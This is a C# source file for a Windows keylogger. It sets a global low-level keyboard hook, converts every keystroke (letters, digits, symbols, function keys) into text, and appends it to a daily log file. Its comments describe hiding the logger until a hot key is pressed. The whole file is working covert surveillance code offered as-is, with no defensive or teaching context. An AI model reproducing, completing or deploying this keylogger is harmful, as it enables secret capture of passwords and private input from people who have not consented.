using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static key.KeyLogger.API;

namespace key.KeyLogger
{
    public class KeyBoard
    {
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkcode = Marshal.ReadInt32(lParam);

                string key = "";
                bool shift = false;
                if (((ushort)API.GetKeyState(API.VK_SHIFT_VALUE) & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;

                if (vkcode > 64 && vkcode < 91)
                {
                    if (caps)
                    {
                        key = shift ? ((Keys)vkcode).ToString().ToLower() : ((Keys)vkcode).ToString();
                    }
                    else if (shift)
                    {
                        key = ((Keys)vkcode).ToString();
                    }
                    else
                    {
                        key = ((Keys)vkcode).ToString().ToLower();
                    }
                }
                else if (vkcode >= 96 && vkcode <= 111)
                {
                    switch (vkcode)
                    {
                        case 96:
                            key = "0";
                            break;

                        case 97:
                            key = "1";
                            break;

                        case 98:
                            key = "2";
                            break;

                        case 99:
                            key = "3";
                            break;

                        case 100:
                            key = "4";
                            break;

                        case 101:
                            key = "5";
                            break;

                        case 102:
                            key = "6";
                            break;

                        case 103:
                            key = "7";
                            break;

                        case 104:
                            key = "8";
                            break;

                        case 105:
                            key = "9";
                            break;

                        case 106:
                            key = "*";
                            break;

                        case 107:
                            key = "+";
                            break;

                        case 108:
                            key = "|";
                            break;

                        case 109:
                            key = "-";
                            break;

                        case 110:
                            key = ".";
                            break;

                        case 111:
                            key = "/";
                            break;
                    }
                }
                else if ((vkcode >= 48 && vkcode <= 57) || (vkcode >= 186 && vkcode <= 222))
                {
                    if (shift)
                    {
                        switch (vkcode)
                        {
                            case 48:
                                key = ")";
                                break;

                            case 49:
                                key = "!";
                                break;

                            case 50:
                                key = "@";
                                break;

                            case 51:
                                key = "#";
                                break;

                            case 52:
                                key = "$";
                                break;

                            case 53:
                                key = "%";
                                break;

                            case 54:
                                key = "^";
                                break;

                            case 55:
                                key = "&";
                                break;

                            case 56:
                                key = "*";
                                break;

                            case 57:
                                key = "(";
                                break;

                            case 186:
                                key = ":";
                                break;

                            case 187:
                                key = "+";
                                break;

                            case 188:
                                key = "<";
                                break;

                            case 189:
                                key = "_";
                                break;

                            case 190:
                                key = ">";
                                break;

                            case 191:
                                key = "?";
                                break;

                            case 192:
                                key = "~";
                                break;

                            case 219:
                                key = "{";
                                break;

                            case 220:
                                key = "|";
                                break;

                            case 221:
                                key = "}";
                                break;

                            case 222:
                                key = "<Double Quotes>";
                                break;
                        }
                    }
                    else
                    {
                        switch (vkcode)
                        {
                            case 48:
                                key = "0";
                                break;

                            case 49:
                                key = "1";
                                break;

                            case 50:
                                key = "2";
                                break;

                            case 51:
                                key = "3";
                                break;

                            case 52:
                                key = "4";
                                break;

                            case 53:
                                key = "5";
                                break;

                            case 54:
                                key = "6";
                                break;

                            case 55:
                                key = "7";
                                break;

                            case 56:
                                key = "8";
                                break;

                            case 57:
                                key = "9";
                                break;

                            case 186:
                                key = ";";
                                break;

                            case 187:
                                key = "=";
                                break;

                            case 188:
                                key = ",";
                                break;

                            case 189:
                                key = "-";
                                break;

                            case 190:
                                key = ".";
                                break;

                            case 191:
                                key = "/";
                                break;

                            case 192:
                                key = "`";
                                break;

                            case 219:
                                key = "[";
                                break;

                            case 220:
                                key = "\\";
                                break;

                            case 221:
                                key = "]";
                                break;

                            case 222:
                                key = "<Single Quote>";
                                break;
                        }
                    }
                }
                else
                {
                    switch ((Keys)vkcode)
                    {
                        case Keys.F1:
                            key = "<F1>";
                            break;

                        case Keys.F2:
                            key = "<F2>";
                            break;

                        case Keys.F3:
                            key = "<F3>";
                            break;

                        case Keys.F4:
                            key = "<F4>";
                            break;

                        case Keys.F5:
                            key = "<F5>";
                            break;

                        case Keys.F6:
                            key = "<F6>";
                            break;

                        case Keys.F7:
                            key = "<F7>";
                            break;

                        case Keys.F8:
                            key = "<F8>";
                            break;

                        case Keys.F9:
                            key = "<F9>";
                            break;

                        case Keys.F10:
                            key = "<F10>";
                            break;

                        case Keys.F11:
                            key = "<F11>";
                            break;

                        case Keys.F12:
                            key = "<F12>";
                            break;

                        case Keys.Snapshot:
                            key = "<Print Screen>";
                            break;

                        case Keys.Scroll:
                            key = "<Scroll Lock>";
                            break;

                        case Keys.Pause:
                            key = "<Pause/Break>";
                            break;

                        case Keys.Insert:
                            key = "<Insert>";
                            break;

                        case Keys.Home:
                            key = "<Home>";
                            break;

                        case Keys.Delete:
                            key = "<Delete>";
                            break;

                        case Keys.End:
                            key = "<End>";
                            break;

                        case Keys.Prior:
                            key = "<Page Up>";
                            break;

                        case Keys.Next:
                            key = "<Page Down>";
                            break;

                        case Keys.Escape:
                            key = "<Esc>";
                            break;

                        case Keys.NumLock:
                            key = "<Num Lock>";
                            break;

                        case Keys.Capital:
                            key = "<Caps Lock>";
                            break;

                        case Keys.Tab:
                            key = "<Tab>";
                            break;

                        case Keys.Back:
                            key = "<Backspace>";
                            break;

                        case Keys.Enter:
                            {
                                key = "<Enter>";
                            }
                            break;

                        case Keys.Space:
                            key = "<Space Bar>";
                            break;

                        case Keys.Left:
                            key = "<Left>";
                            break;

                        case Keys.Right:
                            key = "<Right>";
                            break;

                        case Keys.Up:
                            key = "<Up>";
                            break;

                        case Keys.Down:
                            key = "<Down>";
                            break;

                        case Keys.LMenu:
                            key = "<Alt>";
                            break;

                        case Keys.RMenu:
                            key = "<Alt>";
                            break;

                        case Keys.LWin:
                            key = "<Windows Key>";
                            break;

                        case Keys.RWin:
                            key = "<Windows Key>";
                            break;

                        case Keys.LShiftKey:
                            key = "<Shift Key>";
                            break;

                        case Keys.RShiftKey:
                            key = "<Shift Key>";
                            break;

                        case Keys.LControlKey:
                            key = "<Ctrl>";
                            break;

                        case Keys.RControlKey:
                            key = "<Ctrl>";
                            break;
                    }
                }

                WriteLog(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// Write pressed key into log.txt file
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            //string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            API.CreateFolderText();
            API.CreateFolderDay();
            string logNameToWrite = API.FolderDay + "/" + API.KeyBoard + API.logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        static void WriteLog(string vkCode)
        {
            Console.WriteLine(vkCode);
            //string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            API.CreateFolderText();
            API.CreateFolderDay();
            string logNameToWrite = API.FolderDay + "/" + API.KeyBoard + API.logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write(vkCode);
            sw.Close();
        }

        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        public static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
